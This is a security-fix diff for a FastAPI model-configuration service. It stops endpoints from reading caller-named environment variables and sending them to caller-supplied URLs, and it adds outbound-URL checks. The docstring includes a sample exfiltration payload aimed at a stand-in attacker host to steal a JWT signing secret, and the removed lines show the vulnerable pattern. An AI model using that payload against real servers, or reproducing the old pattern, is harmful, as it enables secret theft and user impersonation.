@@ -21,6 +21,8 @@ from sqlalchemy import or_, select
 from sqlalchemy.ext.asyncio import AsyncSession
 
 from app.api.deps import get_current_user
+from app.core.config import is_sensitive_env_name
+from app.core.net_guard import OutboundURLRejected, validate_outbound_url_async
 from app.core.permissions import Capability, ensure_capability
 from app.db.session import get_db
 from app.model_gateway import PROVIDERS
@@ -48,6 +50,27 @@ async def _ensure_model_access(db, user, m: Model, capability: Capability) -> No
             "该模型配置未归属任何公司（多为升级前登记的遗留配置），"
             "不能直接修改或删除。请先认领：PATCH 时带上自己公司的 company_id。")
     await ensure_capability(db, user.id, m.company_id, capability)
+
+
+# 模型配置里绝不允许引用的服务端敏感变量名（防「先落库、再调用/测试」外发）。
+# 名单本身在 core.config，写入校验与运行时解析共用同一份，避免两处漂移。
+def _reject_sensitive_env(name: str | None) -> None:
+    if is_sensitive_env_name(name):
+        raise HTTPException(
+            400,
+            "出于安全考虑，模型配置不能引用服务端敏感环境变量；"
+            "请改用模型服务自己的密钥变量。")
+
+
+async def _validate_model_base_url(base_url: str | None) -> None:
+    if not base_url:
+        return
+    try:
+        # 本地模型服务常监听私网，故 allow_private=True；元数据地址仍拒绝
+        await validate_outbound_url_async(base_url, allow_private=True)
+    except OutboundURLRejected as e:
+        raise HTTPException(400, f"base_url 不安全：{e}")
+
 
 # 各 provider 对应的默认环境变量名（与 .env.example 保持一致）。
 # 这里只用于"密钥是否就位"的判断，永远不读取/返回密钥内容。
@@ -180,6 +203,8 @@ async def create_model(data: ModelIn, db: AsyncSession = Depends(get_db),
     if data.company_id:
         # 只能登记到自己有管理权的公司名下
         await ensure_capability(db, user.id, data.company_id, Capability.MANAGE)
+    _reject_sensitive_env(data.api_key_env)
+    await _validate_model_base_url(data.base_url)
     payload = data.model_dump()
     payload.pop("provider_type", None)
     m = Model(**payload, provider_type=pt)
@@ -221,6 +246,10 @@ async def update_model(mid: str, data: dict, db: AsyncSession = Depends(get_db),
     allowed = {"name", "base_url", "api_key_env", "model_id", "config"}
     if "provider_type" in data:
         m.provider_type = ModelProviderType(data["provider_type"])
+    if "api_key_env" in data:
+        _reject_sensitive_env(data["api_key_env"])
+    if "base_url" in data:
+        await _validate_model_base_url(data["base_url"])
     for k, v in data.items():
         if k in allowed:
             setattr(m, k, v)
@@ -250,6 +279,13 @@ async def test_model(mid: str, db: AsyncSession = Depends(get_db),
     # 未归属的配置属于共享资源，允许测试；有主的要求可见权限
     if m.company_id is not None:
         await ensure_capability(db, user.id, m.company_id, Capability.VIEW)
+
+    # 防「先落库再测试」绕过：test_model 会把密钥发到 base_url，
+    # 因此这里必须与 list-models 同口径——拒绝服务端敏感变量名，
+    # 并拒绝云元数据地址（本地模型服务允许私网）。
+    _reject_sensitive_env(m.api_key_env)
+    await _validate_model_base_url(m.base_url)
+
     provider = PROVIDERS[m.provider_type](
         base_url=m.base_url or "", api_key=_resolve_api_key(m), model_id=m.model_id)
     try:
@@ -263,40 +299,69 @@ async def test_model(mid: str, db: AsyncSession = Depends(get_db),
 class FetchModelsIn(BaseModel):
     base_url: str
     api_key: str | None = None      # 直接传 key（不落库）
-    api_key_env: str | None = None  # 或环境变量名
+    # 仅为识别旧客户端而保留：服务端**不再**读取任何环境变量，
+    # 传了就 400（见 list_provider_models）。绝不能删掉字段只靠 Pydantic
+    # 忽略未知字段，否则旧客户端会以为生效了。
+    api_key_env: str | None = None
 
 
 @router.post("/providers/list-models")
 async def list_provider_models(data: FetchModelsIn,
                                user=Depends(get_current_user)):
-    """从 OpenAI 兼容供应商拉取可用模型列表（GET /v1/models）。"""
+    """从 OpenAI 兼容供应商拉取可用模型列表（GET /v1/models）。
+
+    ## 安全边界（修复「密钥外发」）
+
+    改造前本接口允许调用方指定 `api_key_env`，服务端会把该环境变量的值
+    当作 `Authorization: Bearer` 发到调用方指定的 `base_url`。于是
+    `{"base_url":"https://attacker.tld","api_key_env":"JWT_SECRET"}` 就能
+    窃取 JWT 签名密钥并伪造任意用户。
+
+    现在的规则：
+    * `api_key_env` 一律拒绝（400）——密钥只能在服务端配置，不接受变量名。
+    * `base_url` 过出站闸门（`allow_private=True`：本地模型服务常监听私网，
+      但云元数据地址仍拒绝）。
+    * 错误响应只回状态码/简短原因，**不回显上游响应体**。
+    """
     import httpx
 
-    key = data.api_key
-    if not key and data.api_key_env:
-        import os
-        key = os.environ.get(data.api_key_env, "")
-    if not key:
-        # 无 key 也尝试请求（部分本地服务如 ollama/llama.cpp 不需要）
-        key = ""
+    if data.api_key_env is not None:
+        raise HTTPException(
+            400,
+            "出于安全考虑，不再支持通过 api_key_env 从环境变量读取密钥；"
+            "请在服务端配置模型密钥后重试。")
+
+    key = data.api_key or ""
+    try:
+        await validate_outbound_url_async(data.base_url, allow_private=True)
+    except OutboundURLRejected as e:
+        raise HTTPException(400, f"base_url 不安全：{e}")
 
     url = data.base_url.rstrip("/")
     if not url.endswith("/models"):
         url = f"{url}/models" if url.endswith("/v1") else f"{url}/v1/models"
     try:
-        async with httpx.AsyncClient(timeout=15, trust_env=False) as client:
+        async with httpx.AsyncClient(timeout=15, trust_env=False,
+                                     follow_redirects=False) as client:
             resp = await client.get(url, headers={"Authorization": f"Bearer {key}"}
                                     if key else {})
             if resp.status_code == 401:
                 return {"status": "error", "error": "认证失败（401）：请检查 API Key"}
-            resp.raise_for_status()
+            if resp.status_code != 200:
+                # 绝不回显上游 body（可能包含回显的密钥或内网信息）
+                return {"status": "error",
+                        "error": f"上游返回 HTTP {resp.status_code}"}
             body = resp.json()
             models = [m.get("id") for m in body.get("data", []) if m.get("id")]
             return {"status": "ok", "base_url": data.base_url, "models": sorted(models)}
     except httpx.ConnectError:
-        return {"status": "error", "error": f"无法连接 {data.base_url}"}
+        return {"status": "error", "error": "无法连接该 base_url"}
+    except OutboundURLRejected as e:
+        raise HTTPException(400, f"base_url 不安全：{e}")
     except Exception as e:
-        return {"status": "error", "error": str(e)[:300]}
+        # 只给异常类型与截断后的说明，避免把上游内容带进响应
+        return {"status": "error",
+                "error": f"{type(e).__name__}: {str(e)[:150]}"}
 
 
 class BatchSelectIn(BaseModel):
@@ -316,6 +381,8 @@ async def batch_import_models(data: BatchSelectIn,
         pt = ModelProviderType(data.provider_type)
     except ValueError:
         raise HTTPException(400, f"provider_type must be one of {list(PROVIDERS)}")
+    _reject_sensitive_env(data.api_key_env)
+    await _validate_model_base_url(data.base_url)
     created, existed = [], []
     q = await db.execute(select(Model))
     existing = {(m.provider_type, m.model_id): m.name for m in q.scalars()}
